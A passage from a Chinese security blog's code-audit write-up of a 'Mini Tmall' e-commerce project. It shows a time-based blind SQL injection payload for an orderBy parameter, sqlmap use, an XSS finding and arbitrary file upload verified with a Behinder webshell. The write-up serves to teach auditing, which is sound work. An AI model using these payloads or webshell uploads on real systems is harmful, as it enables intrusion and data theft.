+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,(SELECT(<span class="hljs-number">1</span>)FROM(SELECT(SLEEP(<span class="hljs-number">2</span>)))test)) 正常响应时间<br><span class="hljs-attribute">orderBy</span>=if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,(SELECT(<span class="hljs-number">1</span>)FROM(SELECT(SLEEP(<span class="hljs-number">2</span>)))test)) sleep <span class="hljs-number">2</span>秒<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240624161601058.png" srcset="/img/loading.gif" lazyload alt="image-20240624161601058"></p>
+<p>使用sqlmap</p>
+<p>orderby参数处加*，保存为txt文件使用sqlmap进行测试</p>
+<p><img src="/img/image-20240624161949709.png" srcset="/img/loading.gif" lazyload alt="image-20240624161949709"></p>
+<h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><h4 id="审计-3"><a href="#审计-3" class="headerlink" title="审计"></a>审计</h4><p>从开发视角来看防护XSS漏洞，大多是过滤&#x2F;转义用户的输入和输出。对于开发人员来说，不可能对每一个输入和输出点进行过滤&#x2F;转义。一般常使用filter层（过滤器）或拦截器进行统一过滤 ，或者所使用的前端框架自带防XSS机制 。所以，<strong>审计XSS漏洞第一步看看filter层是否存在XSS过滤代码</strong>。对本项目审计发现filter层并没有关于防护XSS的代码  </p>
+<p><img src="/img/image-20240624152801634.png" srcset="/img/loading.gif" lazyload alt="image-20240624152801634"></p>
+<p>filter中只做了权限校验相关的检测</p>
+<p>第二步，看看使用的前端框架是什么，版本是多少，以及是否存在防XSS漏洞机制。经过一番查找，发现pom.xml和webapp文件下，都表明使用了传统的JSP。JSP大多配合Filter进行XSS防护，上述我们发现filter层并没有XSS防护机制  </p>
+<p>那么本项目应该存在xss漏洞</p>
+<h4 id="验证-3"><a href="#验证-3" class="headerlink" title="验证"></a>验证</h4><p>见框就可尝试插xss</p>
+<img src="/img/image-20240624162102926.png" srcset="/img/loading.gif" lazyload alt="image-20240624162102926" style="zoom:50%;" /> 
+
+<img src="/img/image-20240624162134038.png" srcset="/img/loading.gif" lazyload alt="image-20240624162134038" style="zoom:67%;" /> 
+
+<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>对于代码审计任意文件上传漏洞来说，首先是看看是否存在文件上传功能，然后进一步审计是否存在任意文件上传漏洞。  或者搜索相关关键字，文件上传关键字如下：  </p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">File<br>FileUpload<br>FileUploadBase<br>FileItemIteratorImpl<br>FileItemStreamImpl<br>FileUtils<br>UploadHandleServlet<br>FileLoadServlet<br>FileOutputStream<br><span class="hljs-keyword">DiskFileItemFactory</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartRequestEntity</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartFile</span><br><span class="hljs-keyword"></span>com.<span class="hljs-keyword">oreilly.servlet.MultipartRequest</span><br></code></pre></td></tr></table></figure>
+
+<p>对于 SpingBoot项目来说，想要SpringBoot内嵌的Tomcat对JSP解析，一定要引入相关依赖。如下图所示  </p>
+<img src="/img/image-20240624153320989.png" srcset="/img/loading.gif" lazyload alt="image-20240624153320989" style="zoom:50%;" /> 
+
+<p>对于很多SpringBoot项目来说，是无需引入解析JSP依赖的。那么对于任意文件上传漏洞来说，上传JSP木马肯定是没有办法解析的。对于任意文件上传漏洞利用，只能通过内存马等方式进行攻击了  </p>
+<h4 id="审计-4"><a href="#审计-4" class="headerlink" title="审计"></a>审计</h4><p>审计上述log4j漏洞处的管理员头像上传功能</p>
+<p><img src="/img/image-20240624153629578.png" srcset="/img/loading.gif" lazyload alt="image-20240624153629578"></p>
+<p>直接提取上传文件后缀与生成的uuid拼接，对文件类型没有任何限制，并且上传到指定的目录中</p>
+<p>用ai分析可能存在的问题：</p>
+<p><img src="/img/image-20240624153934442.png" srcset="/img/loading.gif" lazyload alt="image-20240624153934442"></p>
+<p>存在任意文件上传漏洞</p>
+<h4 id="验证-4"><a href="#验证-4" class="headerlink" title="验证"></a>验证</h4><p>直接上传冰蝎马验证</p>
+<p><img src="/img/image-20240624162724766.png" srcset="/img/loading.gif" lazyload alt="image-20240624162724766"></p>
+<p><img src="/../../../%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/md%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E5%AD%98%E6%94%BE/image-20240624162820924.png" srcset="/img/loading.gif" lazyload alt="image-20240624162820924"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>迷你天猫商城代码审计</div>
+      <div>http://example.com/2024/06/24/迷你天猫商城代码审计/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>r1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/10/%E6%8F%90%E6%9D%83-linux%E6%8F%90%E6%9D%83/" title="提权-linux提权">
+                        <span class="hidden-mobile">提权-linux提权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
